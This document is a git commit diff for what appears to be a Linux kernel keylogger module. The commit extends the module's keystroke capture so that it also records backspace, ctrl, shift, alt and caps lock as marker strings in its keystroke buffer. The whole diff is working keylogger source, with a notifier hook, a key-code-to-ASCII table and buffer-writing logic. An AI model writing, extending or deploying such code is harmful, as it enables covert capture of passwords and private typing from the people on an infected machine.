14d864c891d64d41f53314ca601b6dcb1a75a9bf
niv256 <niv25600@gmail.com>
2020-08-06 00:34:22 +0300

    Add support for special keys

--- src/keylogger.c
+++ src/keylogger.c
@@ -10,18 +10,25 @@ struct notifier_block nb = {
 	.notifier_call = keylogger_notifier
 };
 
+#define add_string_keystrokes(key)										\
+if(pkeystrokes + strlen(key) < keystrokes + sizeof(char)*BUFFER_SIZE){	\
+	strncpy(pkeystrokes,key,strlen(key));								\
+	pkeystrokes += strlen(key);											\
+}
+
 // table for easily converting key codes to ascii
 #define SPACE_KEY_CODE	0x39
 #define FIRST_KEY_CODE	0x2
 #define LAST_KEY_CODE	0x35
 const char character_table[] = {
 	'1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\0', '\t',
-	'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n', '\n',
-	'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '\n', '\n', '\\',
+	'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n', '\0',
+	'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '\n', '\0', '\\',
 	'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/'
 };
 
 static void add_keycode(int key_code);
+static void add_special_keycode(int key_code);
 
 void init_keylogger(void) {
 	memset(keystrokes, 0, sizeof(keystrokes));
@@ -55,6 +62,7 @@ int keylogger_notifier(struct notifier_block *nb, unsigned long action, void *da
 // take a key code and add it to the keylog keystrokes
 static void add_keycode(int key_code) {
 	char ascii = '\0';
+
 	if (key_code >= FIRST_KEY_CODE && key_code <= LAST_KEY_CODE) {
 		ascii = character_table[key_code - FIRST_KEY_CODE];
 	} else if (key_code == SPACE_KEY_CODE) {
@@ -64,6 +72,37 @@ static void add_keycode(int key_code) {
 	if (ascii && pkeystrokes < keystrokes + sizeof(char)*BUFFER_SIZE) {
 		*(pkeystrokes++) = ascii;
 	}
-	return;
+
+	add_special_keycode(key_code);
+}
+
+static void add_special_keycode(int key_code){
+	switch(key_code){
+		case 0xe:
+			add_string_keystrokes("_BACKSPACE_")
+			break;
+
+		case 0x1d:
+		case 0xe0:
+			add_string_keystrokes("_CTRL_")
+			break;
+
+		case 0x2a:
+		case 0x36:
+			add_string_keystrokes("_SHIFT_")
+			break;
+
+		case 0x38:
+		case 0x64:
+			add_string_keystrokes("_ALT_")
+			break;
+
+		case 0x3a:
+			add_string_keystrokes("_CAPSLOCK_")
+			break;
+
+		default:
+			break;
+	}
 }
 
